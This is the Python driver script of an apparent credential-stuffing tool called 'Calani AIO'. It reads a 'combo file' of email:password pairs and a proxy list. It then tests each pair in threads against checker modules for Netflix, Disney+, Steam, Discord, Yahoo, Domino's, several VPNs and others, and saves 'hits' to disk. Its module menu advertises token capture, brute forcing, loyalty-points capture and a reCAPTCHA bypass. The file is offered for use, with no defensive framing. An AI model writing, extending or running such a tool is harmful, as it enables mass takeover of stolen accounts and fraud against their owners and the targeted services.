from modules.variables import Checker, discord_name
from modules.functions import *
from time import sleep
from multiprocessing.dummy import Pool
from threading import Thread

from modules.checkers import nord_vpn
from modules.checkers import bonk_io
from modules.checkers import disney
from modules.checkers import duolingo
from modules.checkers import gfuel
from modules.checkers import crunchyroll
from modules.checkers import bww
from modules.checkers import pornhub
from modules.checkers import honeygain
from modules.checkers import discord
from modules.checkers import steam
from modules.checkers import windscribe
from modules.checkers import instagram
from modules.checkers import uplay
from modules.checkers import paramount
from modules.checkers import ipvanish
from modules.checkers import tunnel_bear
from modules.checkers import plextv
from modules.checkers import origin
from modules.checkers import yahoo
from modules.checkers import dominos
from modules.checkers import dickeys
from modules.checkers import hotspot_shield
from modules.checkers import netflix

modules_list = {
    "bww [points capture | proxyless]":bww,
    "dominos [points capture | recaptcha v3 bypass]":dominos,
    "dickeys [points capture]":dickeys,
    "honeygain [credits capture]":honeygain,
    "yahoo [brute]":yahoo,
    "discord [token capture | solver]":discord,
    "instagram [followers capture]":instagram,
    "disney+ [full capture]":disney,
    "duolingo [full capture]":duolingo,
    "gfuel [full capture]":gfuel,
    "bonk.io [full capture]":bonk_io,
    "uplay [full capture]":uplay,
    "origin [full capture]":origin,
    "steam [full capture]":steam,
    "netflix [full capture]":netflix,
    "paramount [full capture]":paramount,
    "plextv [subscription capture]":plextv,
    "crunchyroll [subscription capture]":crunchyroll,
    "pornhub [subscription capture]":pornhub,
    "nordvpn [subscription capture]":nord_vpn,
    "windscribe [subscription capture]":windscribe,
    "ipvanish [subscription capture]":ipvanish,
    "tunnelbear [subscription capture]":tunnel_bear,
    "hotspot shield [subscription capture]":hotspot_shield,
}

def starter(selected_modules:list):
    """Starts checking accounts"""
    reset_stats()
    set_title(f"Calani AIO | Getting Ready | {discord_name}")
    def initializeChecker(account:str):
        if ':' in account:
            email,password = account.split(":",1)
            if email and password:
                for module in selected_modules:
                    modules_list[module].check(email,password)
                    Checker.cpm += 60
                Checker.remaining.remove(account)
                return
        
        Checker.remaining.remove(account)
        Checker.cpm += 60
        Checker.bad += 1
        

    clear()
    ascii()
    print("\n\n")
    print(f"    [{cyan}>{reset}] Pick Combo File")
    file_path = get_file("Combo File",type="Combo File")
    if not file_path:
        print(f"    [{red}>{reset}] No File Detected")
        sleep(1)
        return
    with open(file_path,errors="ignore") as file:
        before_accounts = file.read().splitlines()
        after_accounts = list(set(before_accounts))
        Checker.accounts = after_accounts.copy()
        Checker.remaining = after_accounts.copy()
        Checker.total_accounts = len(Checker.accounts)
        duplicates = len(before_accounts)-len(after_accounts)
    if not after_accounts:
        print(f"    [{red}>{reset}] No Accounts Detected")
        sleep(1)
        return
    print(f"    [{cyan}>{reset}] Imported {green}{len(before_accounts)}{reset} Accounts")
    if duplicates != 0:
        print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
    sleep(0.5)

    print("\n")

    if Checker.proxy_type != 'none':
        print(f"    [{cyan}>{reset}] Pick Proxy File")
        file_path = get_file("Proxy File",type="Proxy File")
        if not file_path:
            print(f"    [{red}>{reset}] No File Detected")
            sleep(1)
            return
        with open(file_path,errors="ignore") as file:
            before_proxies = file.read().splitlines()
            after_proxies = list(set(before_proxies))
            Checker.proxies = after_proxies
            Checker.total_proxies = len(Checker.proxies)
            duplicates = len(before_proxies)-len(after_proxies)
        if not after_proxies:
            print(f"    [{red}>{reset}] No Proxies Detected")
            sleep(1)
            return
        print(f"    [{cyan}>{reset}] Imported {green}{len(before_proxies)}{reset} Proxies")
        if duplicates != 0:
            print(f"    [{cyan}>{reset}] Removed {green}{duplicates}{reset} Duplicates")
        sleep(0.5)

    Checker.checking = True
    Checker.time = get_time()
    makedirs(f"Results/{Checker.time}",exist_ok=True)

    Thread(target=title,args=(len(selected_modules),),daemon=True).start()
    Thread(target=level_cpm,daemon=True).start()

    clear()
    total_modules = len(selected_modules)
    if not Checker.cui:
        ascii()
        print("\n\n")
    else: Thread(target=cui,args=(total_modules,),daemon=True).start()
    if Checker.total_proxies > Checker.threads: Checker.lockProxies = True
    mainpool = Pool(processes=Checker.threads)
    mainpool.imap_unordered(func=initializeChecker,iterable=Checker.accounts)
    mainpool.close()
    mainpool.join()
    Checker.checking = False
    sleep(0.2)
    clear()
    ascii()
    modules_string = '\n    '.join([module.title().split(' ')[0] for module in selected_modules])
    print(f"""
            
    [{cyan}{total_modules} Modules{reset}]
    {cyan}
    {modules_string}
    {reset}

    {'Hits'.center(11,' ')}{fg(8)}-{reset}  {fg(2)}{numerize(Checker.good)}{reset}
    {'Custom'.center(11,' ')}{fg(8)}-{reset}  {fg(3)}{numerize(Checker.custom)}{reset}
    {'Bad'.center(11,' ')}{fg(8)}-{reset}  {fg(1)}{numerize(Checker.bad)}{reset}

    """)
    save_path = os.path.join(os.getcwd(),f'Results\\{Checker.time}')
    print("\n\n")
    print(f"    [{cyan}>{reset}] Finished Checking")
    print(f"    [{cyan}>{reset}] Saved to \"{save_path}\"")
    input(f"    [{cyan}>{reset}] Press Enter To Go Back")
